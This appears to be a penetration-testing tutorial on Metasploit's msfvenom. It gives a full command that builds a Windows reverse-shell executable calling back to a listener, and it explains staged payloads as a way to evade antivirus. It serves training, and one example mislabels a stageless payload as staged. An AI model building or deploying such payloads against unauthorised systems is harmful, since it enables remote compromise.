# msfvenom

Msfvenom is an integral part of the Metasploit framework, serving as a powerful tool for generating payloads, particularly for reverse and bind shells. It is widely utilized in lower-level exploit development, especially for creating hexadecimal shellcode in scenarios like Buffer Overflow exploits. Beyond that, msfvenom can generate payloads in various formats, including `.exe`, `.aspx`, `.war`, and `.py`. This guide provides a brief overview of msfvenom's capabilities and syntax, focusing on its application in penetration testing.

### Basic Syntax

The standard syntax for using msfvenom is:

```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

#### Example Command

To generate a Windows x64 Reverse Shell in an executable format, you would use the following command:

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
{% endcode %}

#### Breakdown of Options

* **-p** : Specifies the payload to be used.
* **-f** : Defines the output format (e.g., `exe` for executable files).
* **-o** : Indicates the output location and filename for the generated payload.
* **LHOST=**: Sets the IP address to connect back to (typically your tun0 IP when using TryHackMe).
* **LPORT=**: Specifies the local port for the connection (any port between 0 and 65535, with ports below 1024 requiring root privileges).

### Staged vs. Stageless Payloads

#### Staged Payloads

Staged payloads are transmitted in two parts. The first part, known as the **stager**, is executed on the target server and connects back to a listener. The stager does not contain the reverse shell code; instead, it retrieves the actual payload from the listener. This method helps evade traditional antivirus solutions by keeping the payload off the disk.

* **Listener Requirement**: Staged payloads require a special listener, typically the Metasploit `multi/handler`.

#### Stageless Payloads

Stageless payloads are self-contained and execute immediately upon being run. They are easier to use but can be more easily detected by antivirus and intrusion detection systems due to their larger size.

### Meterpreter Shells

Meterpreter is Metasploit's advanced shell, offering a stable and feature-rich environment for post-exploitation tasks. It supports functionalities like file uploads and downloads, making it essential for effective exploitation. However, Meterpreter shells must be managed within Metasploit.

### Payload Naming Conventions

Understanding the naming conventions for payloads is crucial when working with msfvenom. The basic format is:

```bash
<OS>/<arch>/<payload>
```

#### Examples

* **Linux 32-bit Stageless**: `linux/x86/shell_reverse_tcp`
* **Windows 32-bit Stageless**: `windows/shell_reverse_tcp`
* **Windows 64-bit Staged**: `windows/x64/meterpreter/reverse_tcp`
* **Linux 32-bit Staged**: `linux/x86/meterpreter_reverse_tcp`

#### Listing Available Payloads

To view all available payloads, use the command:

```bash
msfvenom --list payloads
```

This command can be piped into `grep` to filter for specific payloads, making it easier to find what you need.

```bash
msfvenom --list payloads | grep "windows/x64/meterpreter/reverse_tcp"
```

